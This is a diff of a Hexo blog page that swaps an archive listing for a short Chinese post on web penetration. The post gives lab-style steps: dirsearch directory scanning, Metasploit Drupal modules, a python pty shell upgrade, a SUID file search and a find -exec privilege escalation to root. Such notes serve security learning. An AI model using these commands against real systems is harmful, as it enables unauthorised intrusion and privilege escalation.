@@ -10,7 +10,7 @@
     
     
     
-    <title>archive_a | hexo</title>
+    <title>web渗透 | hexo</title>
     <link href="http://example.com" rel="prefetch" />
 
     
@@ -107,7 +107,7 @@
                 
                 
                 
-                <li class="current">
+                <li class="">
                     <a href="/archives">
                         <i class="fa fa-archive"></i>归档
                     </a>
@@ -150,19 +150,27 @@
         <div class="container">
             <div class="row">
                 <div class="col-md-8 gal-right" id="mainstay">
-                    <article class="article well article-body" id="article-archive">
+                    
+<article class="article well article-body" id="article">
     <div class="breadcrumb">
         <i class="fa fa-home"></i>
         <a href="http://example.com">hexo</a>
         >
-        <span>归档</span>
+        <span>web渗透</span>
     </div>
     <!-- 大型设备详细文章 -->
     <div class="hidden-xs">
         <div class="title-article">
             <h1>
-                <a href="/archives">归档</a>
+                <a href="/2024/01/02/web_sentou/">web渗透</a>
             </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2024-01-02
+            </span>
+            
         </div>
     </div>
     <!-- 小型设备详细文章 -->
@@ -170,92 +178,37 @@
         <center>
             <div class="title-article">
                 <h4>
-                    <a href="/archives">归档</a>
+                    <a href="/2024/01/02/web_sentou/">web渗透</a>
                 </h4>
             </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2024-01-02
+            </p>
+            <p>
+                
+                
+            </p>
         </center>
     </div>
-    <div class="content-article" style="margin-top: 30px;">
-        
-        
-            <h1 style="font-size: 24px; margin-top: 40px;">2024年</h1>
-            
-        <div class="alert alert-info" style="font-size: 14px; line-height: 2; font-weight: bold;">
-            
-             
-             
-                        <a href="/2024/01/02/web_sentou/">web渗透</a>
-                        <br>
-            
-             
-                        </div>
-                    <h1 style="font-size: 24px; margin-top: 40px;">2023年</h1>
-                    <div class="alert alert-info" style="font-size: 14px; line-height: 2; font-weight: bold;">
-                 
-             
-                        <a href="/2023/12/25/sqli_labs/">sqli_labs</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/20/SQL_ZhuRu/">SQL注入</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/17/vue/">vue导入</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/17/phpstudy_mysql/">phpstudy的mysql服务开启</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/17/php_study/">php的一些基础知识</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/10/python_study1/">python_study</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/10/HTML5/">HTML5的基本知识</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/06/ssh_denglu_Linux/">ssh远程登陆Linux</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/04/linux_stduy/">Linux的学习</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/04/WangLuoAnQuanJiChu/">网络安全知识基础和Proxifier的使用</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/04/AhMyth_use/">Ahmyth的使用</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/03/tuchuang/">图床搭建</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/03/python/">python安装</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/03/daboke/">利用github搭博客</a>
-                        <br>
-            
-             
-                        <a href="/2023/12/03/diaoyuyemianyouhua/">钓鱼页面优化</a>
-                        <br>
-            
-                    </div>
-        
+    <div class="content-article">
+        <ol>
+<li><p><code>dirsearch -u &quot;http://192.168.30.139&quot; -x 403,404</code>  扫目录命令</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/40675516/1703835653161-6b026cbf-db06-464e-9ffc-73001ec1ed91.png?x-oss-process=image/resize,w_937,limit_0" alt="image.png"></p>
+</li>
+<li><p>msf攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search drupal </span><br></pre></td></tr></table></figure>
+</li>
+<li><p>找到NO的，一个个尝试，看哪个可以攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use xxx</span><br><span class="line">show options</span><br><span class="line">set xxx ip地址</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在返回权限之后，继续输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell 进行命令行模式</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot; 用python创建shell</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null 搜索root权限下的文件</span><br><span class="line">find / -name cron.php -exec &quot;/bin/sh&quot; \;  提高权限</span><br></pre></td></tr></table></figure></li>
+</ol>
+
     </div>
 </article>
+
+
                 </div>
                 <aside class="col-md-4 gal-left" id="sidebar">
     <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
@@ -394,7 +347,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/03/daboke/">利用github搭博客</a>
+                    <a href="/2023/12/03/python/">python安装</a>
                 </span>
             </li>
             
@@ -424,13 +377,13 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/10/HTML5/">HTML5的基本知识</a>
+                    <a href="/2023/12/10/python_study1/">python_study</a>
                 </span>
             </li>
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/10/python_study1/">python_study</a>
+                    <a href="/2023/12/17/phpstudy_mysql/">phpstudy的mysql服务开启</a>
                 </span>
             </li>
             
@@ -442,7 +395,7 @@
             
             <li class="list-group-item">
                 <span class="post-title">
-                    <a href="/2023/12/25/sqli_labs/">sqli_labs</a>
+                    <a href="/2024/01/02/web_sentou/">web渗透</a>
                 </span>
             </li>
             
@@ -457,17 +410,17 @@
 
                 
                 <li>
-                    <a href="/archives/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
+                    <a href="/2024/01/02/web_sentou/index.html#sidebar-tags" data-toggle="tab" id="tags-tab">热门标签</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/archives/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
+                    <a href="/2024/01/02/web_sentou/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">友情链接</a>
                 </li>
                 
                 
                 <li>
-                    <a href="/archives/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                    <a href="/2024/01/02/web_sentou/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
                 </li>
                 
             </ul>
